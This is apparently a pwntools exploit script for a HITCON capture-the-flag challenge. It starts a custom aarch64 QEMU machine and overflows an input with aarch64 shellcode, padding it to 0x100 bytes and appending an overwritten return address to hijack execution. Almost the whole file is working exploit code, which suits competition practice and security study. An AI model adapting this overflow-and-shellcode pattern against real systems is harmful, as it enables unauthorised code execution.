from pwn import *
context(arch='aarch64',endian='little')

cmd  = "cd ../../../run ;"
cmd += "./qemu-system-aarch64 -nographic -machine hitcon -cpu hitcon "
cmd += "-bios ./bios.bin -monitor /dev/null 2>/dev/null -serial null "
cmd += "-S -s"

io = process(["/bin/sh","-c",cmd])

shellcode = '''
ldr x1, =0x400104
blr x1
'''

shellcode = asm(shellcode)

io.sendlineafter(b"cmd> ",b"0")
io.sendlineafter(b"index: ",shellcode.ljust(0x100,b'a')+p64(0x412650))
io.interactive()